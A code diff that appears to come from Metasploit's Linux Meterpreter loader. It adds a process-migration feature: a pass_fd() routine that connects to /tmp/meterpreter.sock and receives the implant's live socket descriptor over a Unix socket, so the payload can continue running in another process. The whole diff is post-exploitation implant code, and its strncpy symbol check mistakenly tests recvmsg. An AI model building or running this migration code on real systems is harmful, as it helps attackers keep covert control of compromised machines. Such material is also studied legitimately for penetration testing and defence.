@@ -15,6 +15,7 @@
 #include <sys/stat.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
+#include <sys/un.h>
 #include <endian.h>
 
 #include <sys/sysmacros.h>
@@ -62,12 +63,16 @@ extern int (*pthread_mutex_lock_fp)(pthread_mutex_t *mutex);
 extern int (*pthread_mutex_unlock_fp)(pthread_mutex_t *mutex);
 
 int dlsocket(void *libc);
+int pass_fd(void *libc); 
 void perform_fd_cleanup(int *fd);
 
-#define OPT_DEBUG_ENABLE	(1 << 0)
-#define OPT_NO_FD_CLEANUP	(1 << 1)
+#define OPT_DEBUG_ENABLE  (1 << 0)
+#define OPT_NO_FD_CLEANUP (1 << 1)
+#define OPT_PASS_FD       (1 << 2)
 
 int global_debug = 0;
+
+char sock_path[UNIX_PATH_MAX] = "/tmp/meterpreter.sock";
 
 /*
  * Map in libraries, and hand off execution to the meterpreter server
@@ -113,7 +118,32 @@ unsigned metsrv_rtld(int fd, int options)
 		pthread_mutex_unlock_fp = unlock_sym;
 	}
 
-	if(fstat(fd, &statbuf) == -1) {
+	if (options & OPT_PASS_FD) {
+		unsigned int (*sleep)(unsigned int seconds);
+		int (*raise)(int sig);
+
+		TRACE("[ Solving symbols ]\n");
+		sleep = dlsym(libs[LIBC_IDX].handle, "sleep");
+		if (!sleep) {
+			TRACE("[	Failed to solve sleep ]\n");
+			exit(-1);
+		}
+
+		raise = dlsym(libs[LIBC_IDX].handle, "raise");
+		if (!raise) {
+			TRACE("[	Failed to solve raise ]\n");
+			exit(-1);
+		}
+
+		fd = pass_fd(libs[LIBC_IDX].handle);
+		if (fd == -1) {
+			exit(-1);
+		} else {
+			TRACE("[ Warning the migrating process and give to the server time to catch up... ]\n");
+			raise(SIGTRAP);
+			sleep(4);
+		}
+	} else if(fstat(fd, &statbuf) == -1) {
 		options = OPT_DEBUG_ENABLE;
 
 		TRACE("[ supplied fd fails fstat() check, using dlsocket() ]\n");
@@ -135,6 +165,7 @@ unsigned metsrv_rtld(int fd, int options)
 		global_debug = 1;
 		enable_debugging();
 	}
+
 	TRACE("[ logging will stop unless OPT_NO_FD_CLEANUP is set ]\n");
 
 	if(!(options & OPT_NO_FD_CLEANUP)) {
@@ -237,6 +268,91 @@ int dlsocket(void *libc)
 
 	return retcode;
 
+}
+
+int pass_fd(void *libc) {
+	int (*socket)(int domain, int type, int protocol);
+	int (*connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+	ssize_t (*recvmsg)(int sockfd, struct msghdr *msg, int flags);
+	char * (*strncpy)(char *dst, const char *src, size_t n);
+	int fd = -1;
+		
+	TRACE("[ Receiving socket file descriptor ]\n");
+	TRACE("[ Solving symbols ]\n");
+
+	socket = dlsym(libc, "socket");
+	if (!socket) {
+		TRACE("[	Failed to solve socket ]\n");
+		return -1;
+	}
+
+	connect = dlsym(libc, "connect");
+	if (!connect) {
+		TRACE("[	Failed to solve connect ]\n");
+		return -1;
+	}
+
+	recvmsg = dlsym(libc, "recvmsg");
+	if (!recvmsg) {
+		TRACE("[	Failed to solve recvmsg ]\n");
+		return -1;
+	}
+
+	strncpy = dlsym(libc, "strncpy");
+	if (!recvmsg) {
+		TRACE("[	Failed to solve strncpy ]\n");
+		return -1;
+	}
+
+	TRACE("[ Creating the message structs ]\n");
+
+	char buf[80];
+	struct iovec vector;
+	struct msghdr msg;
+	struct cmsghdr * cmsg;
+
+	int s, t, len;
+	struct sockaddr_un remote;
+
+	vector.iov_base = buf;
+	vector.iov_len = 80;
+
+	msg.msg_name = NULL;
+	msg.msg_namelen = 0;
+	msg.msg_iov = &vector;
+	msg.msg_iovlen = 1;
+
+	cmsg = alloca(sizeof(struct cmsghdr) + sizeof(fd));
+	cmsg->cmsg_len = sizeof(struct cmsghdr) + sizeof(fd);
+	msg.msg_control = cmsg;
+	msg.msg_controllen = cmsg->cmsg_len;
+
+	TRACE("[ Creating local unix socket ]\n");
+	if ((s = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
+		TRACE("[	Failed to create UNIX SOCKET ]\n");
+		return -1;
+	}
+
+	remote.sun_family = AF_UNIX;
+	strncpy(remote.sun_path, sock_path, UNIX_PATH_MAX - 1);
+	len = strlen(remote.sun_path) + sizeof(remote.sun_family);
+	if (connect(s, (struct sockaddr *)&remote, len) == -1) {
+		TRACE("[	ERROR connecting ]\n");
+		return -1;
+	}
+
+	if (!recvmsg(s, &msg, 0)) {
+		TRACE("[	ERROR recvmsg ]\n");
+		return -1;
+	}
+
+	TRACE("[	Got file descriptor for '%s' ]\n", (char *) vector.iov_base);
+	close(s);
+
+	TRACE("[	Extracting fd... ]\n");
+	memcpy(&fd, CMSG_DATA(cmsg), sizeof(fd));
+	TRACE("[	fd for socket %d ]\n", fd);
+	return fd;
 }
 
 extern soinfo *solist;
